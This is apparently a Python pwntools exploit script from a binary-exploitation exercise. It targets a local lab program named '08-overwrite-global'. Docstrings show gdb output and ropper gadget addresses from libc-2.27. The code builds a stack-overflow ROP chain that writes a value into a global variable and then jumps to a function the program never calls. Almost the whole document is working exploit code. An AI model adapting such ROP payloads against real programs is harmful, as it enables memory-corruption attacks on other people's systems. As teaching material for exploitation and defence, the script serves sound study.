#!/usr/bin/python

"""
(gdb) b *(&vulnerable)
Breakpoint 1 at 0x400607: file src/08-overwrite-global.c, line 8.
(gdb) c
Continuing.
Reading /lib/x86_64-linux-gnu/libc.so.6 from remote target...
Reading /lib/x86_64-linux-gnu/libc-2.27.so from remote target...
Reading /lib/x86_64-linux-gnu/.debug/libc-2.27.so from remote target...

Breakpoint 1, vulnerable () at src/08-overwrite-global.c:8
8	int vulnerable() {
(gdb) i r $rsp
rsp            0x7fffffffdda8	0x7fffffffdda8
(gdb) p &buffer[0]
$1 = 0x7fffffffdd20 "\377\377\377\377"
(gdb) info proc mappings
process 7590
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
...
      0x7ffff79e4000     0x7ffff7bcb000   0x1e7000        0x0 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7bcb000     0x7ffff7dcb000   0x200000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcb000     0x7ffff7dcf000     0x4000   0x1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
      0x7ffff7dcf000     0x7ffff7dd1000     0x2000   0x1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
...
"""

"""
$ ropper --nocolor --file /lib/x86_64-linux-gnu/libc-2.27.so
0x00000000000439c8: pop rax; ret;
0x000000000002155f: pop rdi; ret;
0x0000000000097055: mov qword ptr [rax], rdi; ret;
"""

import struct
import sys

from pwn import *

context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = './bin/x86-64/08-overwrite-global'

vulnerable_ret_addr = 0x7fffffffdda8
buffer_addr = 0x7fffffffdd20
libc_addr = 0x7ffff79e4000

pop_rax_ret_addr = libc_addr + 0x00000000000439c8
pop_rdi_ret_addr = libc_addr + 0x000000000002155f
mov_qword_ptr_rax_rdi_ret_addr = libc_addr + 0x0000000000097055

binary = ELF(binary_path)
not_called_addr = binary.symbols['not_called']
x_addr = binary.symbols['x']

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (vulnerable_ret_addr - buffer_addr)
payload += p64(pop_rax_ret_addr)
payload += p64(x_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(0xdeadbabebeefc0de)
payload += p64(mov_qword_ptr_rax_rdi_ret_addr)
payload += p64(not_called_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
